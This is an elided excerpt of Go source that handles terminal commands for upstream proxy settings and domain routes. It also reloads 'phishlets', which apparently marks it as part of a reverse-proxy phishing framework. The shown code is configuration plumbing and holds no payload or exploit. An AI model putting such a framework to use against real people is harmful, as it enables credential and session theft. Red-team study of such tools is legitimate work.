...
func (t *Terminal) handleProxy(args []string) error {
	...
	if pn == 0 {
		...
		proxy_pass := ""
		if t.cfg.proxyConfig.Password != "" {
			proxy_pass = strings.Repeat("*", len(t.cfg.proxyConfig.Password))
		}

		keys := []string{"enabled", "type", "address", "port", "username", "password", "routes"}
		vals := []string{proxy_enabled, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, strconv.Itoa(t.cfg.proxyConfig.Port), t.cfg.proxyConfig.Username, proxy_pass, strings.Join(t.cfg.proxyConfig.Routes, ", ")}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		...
		// live re-apply helper: routes/fields changed while the proxy is on
		applyIfEnabled := func() {
			if t.cfg.proxyConfig.Enabled {
				if err := t.p.setProxy(true, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, t.cfg.proxyConfig.Port, t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password); err != nil {
					log.Error("proxy: %v", err)
				}
			}
		}
		switch args[0] {
		case "routes":
			if len(t.cfg.proxyConfig.Routes) == 0 {
				log.Info("proxy routes: (none — ALL upstream traffic goes through the proxy)")
			} else {
				log.Info("proxy routes: %s", strings.Join(t.cfg.proxyConfig.Routes, ", "))
			}
			return nil
		case "route":
			if pn < 3 {
				return fmt.Errorf("usage: proxy route add|del <domain-suffix>")
			}
			action := args[1]
			sfx := strings.ToLower(strings.TrimPrefix(strings.TrimSpace(args[2]), "*."))
			if sfx == "" {
				return fmt.Errorf("empty domain suffix")
			}
			routes := t.cfg.proxyConfig.Routes
			out := make([]string, 0, len(routes)+1)
			if action == "add" {
				for _, r := range routes {
					if r == sfx {
						log.Info("proxy route already exists: %s", sfx)
						return nil
					}
					out = append(out, r)
				}
				...
				if !found {
					log.Info("proxy route not found: %s", sfx)
					return nil
				}
			} else {
				return fmt.Errorf("unknown route action: %s (use add|del)", action)
			}
			t.cfg.SetProxyRoutes(out)
			applyIfEnabled()
			log.Info("proxy route %s: %s (applied live)", action, sfx)
			return nil
		case "type":
			if t.cfg.proxyConfig.Enabled {
...
func (t *Terminal) handlePhishlets(args []string) error {
	...
	if pn >= 3 && args[0] == "create" {
		...
		if args[0] == "reload" {
			rep, err := t.cfg.ReloadPhishlets(t.cfg.PhishletsDir)
			if err != nil {
				log.Error("reload: %v", err)
				return nil
			}
			t.p.RefreshCerts()
			log.Info("phishlets reloaded: +%d ~%d -%d", len(rep.Added), len(rep.Reloaded), len(rep.Removed))
			return nil
		}
